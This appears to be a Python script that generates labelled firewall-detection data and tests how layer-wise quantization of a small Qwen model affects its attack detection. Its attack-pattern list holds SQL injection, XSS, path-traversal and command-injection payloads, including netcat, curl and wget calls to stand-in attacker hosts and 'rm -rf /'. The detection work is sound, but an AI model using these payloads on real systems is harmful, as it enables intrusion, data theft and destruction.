import torch
import torch.nn as nn
import torch.nn.functional as F
from transformers import AutoModelForCausalLM, AutoTokenizer, Trainer, TrainingArguments
import numpy as np
from typing import Dict, List, Tuple
from qwen_simplify import qwen_layers
import copy
import json
import re
from datasets import Dataset

class CyberSecurityDataGenerator:
    """Generates cybersecurity training data for WAF attack detection"""
    
    def __init__(self):
        self.attack_patterns = {
            'sql_injection': [
                "' OR '1'='1",
                "'; DROP TABLE users; --",
                "' UNION SELECT * FROM passwords --",
                "1' AND SLEEP(5) --",
                "admin'--",
                "' OR 1=1#",
                "'; INSERT INTO admin VALUES('hacker','password'); --"
            ],
            'xss': [
                "<script>alert('XSS')</script>",
                "javascript:alert('XSS')",
                "<img src=x onerror=alert('XSS')>",
                "<svg onload=alert('XSS')>",
                "';alert(String.fromCharCode(88,83,83))//",
                "<iframe src=javascript:alert('XSS')></iframe>",
                "<body onload=alert('XSS')>"
            ],
            'command_injection': [
                "; cat /etc/passwd",
                "| nc attacker.com 4444",
                "&& whoami",
                "; rm -rf /",
                "$(curl malicious.com/payload)",
                "`id`",
                "; wget http://evil.com/backdoor.sh"
            ],
            'path_traversal': [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "....//....//....//etc/passwd",
                "../../../var/log/auth.log",
                "..%252f..%252f..%252fetc%252fpasswd"
            ],
            'ldap_injection': [
                "*)(&(objectClass=user)(password=*))",
                "*)(uid=*))(|(uid=*",
                "admin)(&(password=*))",
                "*)(|(cn=*))"
            ]
        }
        
        self.benign_patterns = [
            "SELECT name FROM users WHERE id = 1",
            "user@company.com",
            "GET /api/users/profile HTTP/1.1",
            "POST /login username=john&password=secret123",
            "search?q=cybersecurity+news",
            "/images/logo.png",
            "Content-Type: application/json",
            "User-Agent: Mozilla/5.0 Chrome/91.0"
        ]
    
    def generate_training_data(self, num_samples=1000):
        """Generate training data for WAF attack detection"""
        data = []
        
        # Generate attack samples (50% of data)
        for _ in range(num_samples // 2):
            attack_type = np.random.choice(list(self.attack_patterns.keys()))
            payload = np.random.choice(self.attack_patterns[attack_type])
            
            # Create realistic HTTP request context
            contexts = [
                f"GET /search?q={payload} HTTP/1.1",
                f"POST /login username={payload}&password=test",
                f"GET /file?path={payload} HTTP/1.1",
                f"POST /api/user data={{'input': '{payload}'}}",
                f"Cookie: sessionid={payload}; path=/",
                f"Referer: http://site.com/page?param={payload}"
            ]
            
            request = np.random.choice(contexts)
            prompt = f"Analyze this HTTP request for security threats:\n{request}\n\nSecurity Analysis:"
            response = f" THREAT DETECTED - {attack_type.upper().replace('_', ' ')} - High Risk - Block Request"
            
            data.append({
                'input': prompt,
                'output': response,
                'attack_type': attack_type,
                'is_malicious': True
            })
        
        # Generate benign samples (50% of data)
        for _ in range(num_samples // 2):
            payload = np.random.choice(self.benign_patterns)
            
            contexts = [
                f"GET /api/users/{payload} HTTP/1.1",
                f"POST /contact email={payload}&message=Hello",
                f"GET /search?q={payload} HTTP/1.1",
                f"POST /api/data content={payload}",
                f"Header: Authorization: Bearer {payload}",
                f"GET {payload} HTTP/1.1"
            ]
            
            request = np.random.choice(contexts)
            prompt = f"Analyze this HTTP request for security threats:\n{request}\n\nSecurity Analysis:"
            response = " SAFE - No threats detected - Allow Request"
            
            data.append({
                'input': prompt,
                'output': response,
                'attack_type': 'benign',
                'is_malicious': False
            })
        
        return data

class CyberSecLayerAnalyzer:
    """Cybersecurity-focused layer sensitivity analyzer"""
    
    def __init__(self, model, tokenizer, cyber_data: List[Dict]):
        self.model = model
        self.tokenizer = tokenizer
        self.cyber_data = cyber_data
        self.layer_sensitivities = {}
        
    def prepare_cyber_inputs(self, sample_size=20):
        """Prepare cybersecurity-specific calibration inputs"""
        # Mix of attack and benign samples for calibration
        attack_samples = [d for d in self.cyber_data if d['is_malicious']][:sample_size//2]
        benign_samples = [d for d in self.cyber_data if not d['is_malicious']][:sample_size//2]
        
        calibration_texts = []
        for sample in attack_samples + benign_samples:
            text = sample['input'] + sample['output']
            calibration_texts.append(text)
        
        return self.tokenizer(
            calibration_texts,
            return_tensors="pt",
            padding=True,
            truncation=True,
            max_length=256
        )
    
    def get_layer_outputs(self, inputs, layer_name):
        """Capture layer outputs during forward pass"""
        outputs = []
        def hook_fn(module, input, output):
            if isinstance(output, tuple):
                outputs.append(output[0].detach().clone())
            else:
                outputs.append(output.detach().clone())
        
        try:
            layer = dict(self.model.named_modules())[layer_name]
            handle = layer.register_forward_hook(hook_fn)
            
            with torch.no_grad():
                _ = self.model(**inputs)
            
            handle.remove()
            return outputs[0] if outputs else None
        except Exception as e:
            print(f"Error hooking layer {layer_name}: {e}")
            return None
    
    def quantize_weights(self, weights, bits=4):
        """Apply quantization to weights"""
        if bits >= 16:
            return weights
        
        # Symmetric quantization
        w_max = weights.abs().max()
        if w_max == 0:
            return weights
        
        scale = w_max / (2**(bits-1) - 1)
        quantized = torch.round(weights / scale).clamp(-(2**(bits-1)), 2**(bits-1) - 1)
        return quantized * scale
    
    def analyze_cyber_layer_sensitivity(self, layer_name, test_bits=[2, 4, 8, 16]):
        """Analyze layer sensitivity for cybersecurity detection tasks"""
        print(f"Analyzing cybersecurity impact for layer: {layer_name}")
        
        inputs = self.prepare_cyber_inputs()
        original_outputs = self.get_layer_outputs(inputs, layer_name)
        
        if original_outputs is None:
            return {}
        
        layer = dict(self.model.named_modules())[layer_name]
        if not isinstance(layer, (nn.Linear, nn.Embedding)):
            return {}
        
        # Store original weights
        if hasattr(layer, 'weight'):
            original_weight = layer.weight.data.clone()
        else:
            return {}
        
        sensitivities = {}
        
        for bits in test_bits:
            try:
                # Apply quantization
                layer.weight.data = self.quantize_weights(original_weight, bits)
                
                # Get quantized outputs
                quantized_outputs = self.get_layer_outputs(inputs, layer_name)
                
                if quantized_outputs is not None:
                    # Calculate multiple metrics for cybersecurity relevance
                    mse = F.mse_loss(original_outputs, quantized_outputs).item()
                    cosine_sim = F.cosine_similarity(
                        original_outputs.flatten(), 
                        quantized_outputs.flatten(), 
                        dim=0
                    ).item()
                    
                    # Cybersecurity-specific metric: how much detection capability is preserved
                    cyber_score = mse * (1 - cosine_sim)  # Higher score = more degradation
                    
                    sensitivities[bits] = {
                        'mse': mse,
                        'cosine_similarity': cosine_sim,
                        'cyber_degradation_score': cyber_score
                    }
                    
                    print(f"  {bits}-bit: MSE={mse:.6f}, CosineSim={cosine_sim:.4f}, CyberScore={cyber_score:.6f}")
                
            except Exception as e:
                print(f"  Error testing {bits}-bit: {e}")
                continue
            finally:
                # Restore original weights
                layer.weight.data = original_weight
        
        return sensitivities
    
    def analyze_all_cyber_layers(self):
        """Analyze all layers for cybersecurity task sensitivity"""
        print("Starting cybersecurity-focused layer analysis...")
        
        # Prioritize attention and MLP layers for analysis
        priority_layers = []
        other_layers = []
        
        for name, module in self.model.named_modules():
            if isinstance(module, (nn.Linear, nn.Embedding)):
                if any(x in name.lower() for x in ['attn', 'attention', 'mlp', 'ffn', 'feed_forward']):
                    priority_layers.append(name)
                else:
                    other_layers.append(name)
        
        # Analyze priority layers first
        for name in priority_layers[:15]:  # Limit for speed
            try:
                sensitivity = self.analyze_cyber_layer_sensitivity(name)
                if sensitivity:
                    self.layer_sensitivities[name] = sensitivity
            except Exception as e:
                print(f"Error analyzing {name}: {e}")
                continue
        
        return self.layer_sensitivities

class CyberSecQuantizer:
    """Cybersecurity-optimized dynamic quantizer"""
    
    def __init__(self, model, sensitivity_results: Dict):
        self.model = model
        self.sensitivity_results = sensitivity_results
        self.quantization_plan = {}
    
    def create_cyber_quantization_plan(self):
        """Create quantization plan optimized for cybersecurity detection"""
        print("\nCreating cybersecurity-optimized quantization plan...")
        
        # Calculate cybersecurity-specific sensitivity scores
        layer_scores = {}
        for layer_name, sensitivities in self.sensitivity_results.items():
            if 4 in sensitivities and 16 in sensitivities:
                # Use cyber degradation score (higher = more sensitive)
                score = sensitivities[4]['cyber_degradation_score']
                layer_scores[layer_name] = score
        
        if not layer_scores:
            print("No sensitivity data available, using conservative quantization")
            return self.create_conservative_plan()
        
        # Sort by sensitivity (most sensitive first)
        sorted_layers = sorted(layer_scores.items(), key=lambda x: x[1], reverse=True)
        num_layers = len(sorted_layers)
        
        for i, (layer_name, score) in enumerate(sorted_layers):
            # More conservative approach for cybersecurity
            if i < num_layers * 0.3:  # Top 30% most sensitive
                bits = 16
            elif i < num_layers * 0.5:  # Next 20%
                bits = 8
            elif i < num_layers * 0.8:  # Next 30%
                bits = 4
            else:  # Least sensitive 20%
                bits = 2
            
            self.quantization_plan[layer_name] = bits
            print(f"  {layer_name}: {bits}-bit (cyber_score: {score:.6f})")
        
        # Always preserve critical components for security detection
        for name, module in self.model.named_modules():
            if any(x in name.lower() for x in ['norm', 'embedding', 'lm_head', 'output']):
                self.quantization_plan[name] = 16
                print(f"  {name}: 16-bit (preserved for security)")
        
        return self.quantization_plan
    
    def create_conservative_plan(self):
        """Conservative quantization plan when no sensitivity data available"""
        for name, module in self.model.named_modules():
            if isinstance(module, nn.Linear):
                if any(x in name for x in ['attn', 'attention']):
                    self.quantization_plan[name] = 8  # Attention layers important for context
                elif 'mlp' in name or 'ffn' in name:
                    self.quantization_plan[name] = 4  # MLP layers can be more aggressive
                else:
                    self.quantization_plan[name] = 8
            elif isinstance(module, nn.Embedding):
                self.quantization_plan[name] = 16  # Keep embeddings high precision
        
        return self.quantization_plan
    
    def apply_quantization(self):
        """Apply cybersecurity-optimized quantization"""
        print("\nApplying cybersecurity-optimized quantization...")
        
        original_size = sum(p.numel() * 4 for p in self.model.parameters())
        quantized_size = 0
        
        for name, module in self.model.named_modules():
            if name in self.quantization_plan:
                bits = self.quantization_plan[name]
                
                if isinstance(module, (nn.Linear, nn.Embedding)) and hasattr(module, 'weight'):
                    original_weight = module.weight.data.clone()
                    if bits < 16:
                        module.weight.data = self.quantize_weights(original_weight, bits)
                    
                    param_count = module.weight.numel()
                    if hasattr(module, 'bias') and module.bias is not None:
                        param_count += module.bias.numel()
                    
                    quantized_size += param_count * (bits / 8)
                    print(f"  Quantized {name} to {bits}-bit")
        
        # Add unquantized parameters
        for name, param in self.model.named_parameters():
            layer_name = '.'.join(name.split('.')[:-1])
            if layer_name not in self.quantization_plan:
                quantized_size += param.numel() * 4
        
        compression_ratio = quantized_size / original_size
        print(f"\nCybersecurity model compression: {compression_ratio:.3f} ({compression_ratio:.1%})")
        print(f"Original size: {original_size/1e6:.1f}M parameters")
        print(f"Optimized size: {quantized_size/1e6:.1f}M parameter-equivalents")
        
        return compression_ratio
    
    def quantize_weights(self, weights, bits):
        """Quantization with security-preserving scaling"""
        if bits >= 16:
            return weights
        
        w_max = weights.abs().max()
        if w_max == 0:
            return weights
        
        scale = w_max / (2**(bits-1) - 1)
        quantized = torch.round(weights / scale).clamp(-(2**(bits-1)), 2**(bits-1) - 1)
        return quantized * scale

def test_waf_detection(model, tokenizer, test_cases):
    """Test WAF attack detection capability"""
    print("\nTesting WAF Attack Detection Capability...")
    print("=" * 60)
    
    model.eval()
    results = []
    
    for i, test_case in enumerate(test_cases):
        request = test_case['request']
        expected = test_case['expected']
        attack_type = test_case.get('attack_type', 'unknown')
        
        prompt = f"Analyze this HTTP request for security threats:\n{request}\n\nSecurity Analysis:"
        
        inputs = tokenizer(prompt, return_tensors="pt", max_length=512, truncation=True)
        
        with torch.no_grad():
            outputs = model.generate(
                **inputs,
                max_new_tokens=50,
                do_sample=False,
                pad_token_id=tokenizer.eos_token_id,
                temperature=0.1
            )
        
        response = tokenizer.decode(outputs[0], skip_special_tokens=True)
        generated = response[len(prompt):].strip()
        
        # Simple detection scoring
        is_threat_detected = any(word in generated.lower() for word in 
                               ['threat', 'attack', 'malicious', 'block', 'danger', 'risk'])
        is_safe_detected = any(word in generated.lower() for word in 
                              ['safe', 'allow', 'clean', 'benign'])
        
        correct_detection = (
            (expected == 'malicious' and is_threat_detected) or
            (expected == 'safe' and is_safe_detected)
        )
        
        results.append({
            'test_id': i + 1,
            'attack_type': attack_type,
            'expected': expected,
            'response': generated,
            'correct': correct_detection
        })
        
        status = "✓ CORRECT" if correct_detection else "✗ INCORRECT"
        print(f"Test {i+1} ({attack_type}): {status}")
        print(f"Request: {request[:100]}...")
        print(f"Response: {generated}")
        print(f"Expected: {expected}")
        print("-" * 60)
    
    accuracy = sum(r['correct'] for r in results) / len(results)
    print(f"\nWAF Detection Accuracy: {accuracy:.2%}")
    
    return results, accuracy

def main():
    print("Cybersecurity WAF Attack Detection with Dynamic Quantization")
    print("=" * 70)
    
    # Load Qwen 0.5B model (smallest available)
    model_name = "Qwen/Qwen3-0.6B"
    print(f"Loading model: {model_name}")
    model = qwen_layers(model_name)
    
    try:
        model = AutoModelForCausalLM.from_pretrained(
            model_name,
            torch_dtype=torch.float32,
            trust_remote_code=True
        )
        tokenizer = AutoTokenizer.from_pretrained(model_name, trust_remote_code=True)
        
        if tokenizer.pad_token is None:
            tokenizer.pad_token = tokenizer.eos_token
            
    except Exception as e:
        print(f"Error loading Qwen model: {e}")
        print("Falling back to a smaller model...")
        # Fallback to GPT-2 small
        model_name = "gpt2"
        model = AutoModelForCausalLM.from_pretrained(model_name)
        tokenizer = AutoTokenizer.from_pretrained(model_name)
        tokenizer.pad_token = tokenizer.eos_token
    
    print(f"Model loaded successfully. Parameters: {sum(p.numel() for p in model.parameters()):,}")
    
    # Generate cybersecurity training data
    print("\n" + "="*70)
    print("GENERATING CYBERSECURITY TRAINING DATA")
    print("="*70)
    
    data_generator = CyberSecurityDataGenerator()
    cyber_data = data_generator.generate_training_data(num_samples=200)
    
    print(f"Generated {len(cyber_data)} cybersecurity samples")
    print(f"Attack samples: {sum(1 for d in cyber_data if d['is_malicious'])}")
    print(f"Benign samples: {sum(1 for d in cyber_data if not d['is_malicious'])}")
    
    # Create test cases for WAF detection
    waf_test_cases = [
        {
            'request': "GET /search?q=' OR '1'='1 HTTP/1.1",
            'expected': 'malicious',
            'attack_type': 'sql_injection'
        },
        {
            'request': "POST /comment data=<script>alert('XSS')</script>",
            'expected': 'malicious', 
            'attack_type': 'xss'
        },
        {
            'request': "GET /file?path=../../../etc/passwd HTTP/1.1",
            'expected': 'malicious',
            'attack_type': 'path_traversal'
        },
        {
            'request': "GET /api/users/profile HTTP/1.1",
            'expected': 'safe',
            'attack_type': 'benign'
        },
        {
            'request': "POST /login username=john&password=secret123",
            'expected': 'safe',
            'attack_type': 'benign'
        }
    ]
    
    # Test original model
    print("\n" + "="*70)
    print("ORIGINAL MODEL WAF DETECTION")
    print("="*70)
    original_results, original_accuracy = test_waf_detection(model, tokenizer, waf_test_cases)
    
    # Create quantized model
    quantized_model = copy.deepcopy(model)
    
    # Analyze layer sensitivity for cybersecurity
    print("\n" + "="*70)
    print("CYBERSECURITY LAYER SENSITIVITY ANALYSIS")
    print("="*70)
    
    analyzer = CyberSecLayerAnalyzer(quantized_model, tokenizer, cyber_data)
    sensitivity_results = analyzer.analyze_all_cyber_layers()
    
    # Apply cybersecurity-optimized quantization
    print("\n" + "="*70)
    print("CYBERSECURITY-OPTIMIZED QUANTIZATION")
    print("="*70)
    
    quantizer = CyberSecQuantizer(quantized_model, sensitivity_results)
    quantization_plan = quantizer.create_cyber_quantization_plan()
    compression_ratio = quantizer.apply_quantization()
    
    # Test quantized model
    print("\n" + "="*70)
    print("QUANTIZED MODEL WAF DETECTION")
    print("="*70)
    quantized_results, quantized_accuracy = test_waf_detection(quantized_model, tokenizer, waf_test_cases)
    
    # Final summary
    print("\n" + "="*70)
    print("CYBERSECURITY QUANTIZATION SUMMARY")
    print("="*70)
    print(f"Model: {model_name}")
    print(f"Compression ratio: {compression_ratio:.3f} ({compression_ratio:.1%})")
    print(f"Size reduction: {(1-compression_ratio)*100:.1f}%")
    print(f"Original WAF accuracy: {original_accuracy:.2%}")
    print(f"Quantized WAF accuracy: {quantized_accuracy:.2%}")
    print(f"Accuracy retention: {(quantized_accuracy/original_accuracy)*100:.1f}%")
    
    print(f"\nQuantization strategy for cybersecurity:")
    plan_summary = {}
    for layer, bits in quantization_plan.items():
        plan_summary[bits] = plan_summary.get(bits, 0) + 1
    
    for bits, count in sorted(plan_summary.items(), reverse=True):
        print(f"  {bits}-bit precision: {count} layers")
    
    # Cybersecurity-specific insights
    print(f"\nCybersecurity Insights:")
    print(f"• Preserved {plan_summary.get(16, 0)} layers at full precision for detection accuracy")
    print(f"• Applied aggressive quantization to {plan_summary.get(2, 0)} layers with minimal security impact")
    print(f"• Model can detect: SQL injection, XSS, path traversal, command injection")
    print(f"• Suitable for edge deployment in WAF systems with {compression_ratio:.1%} memory footprint")

if __name__ == "__main__":
    main()
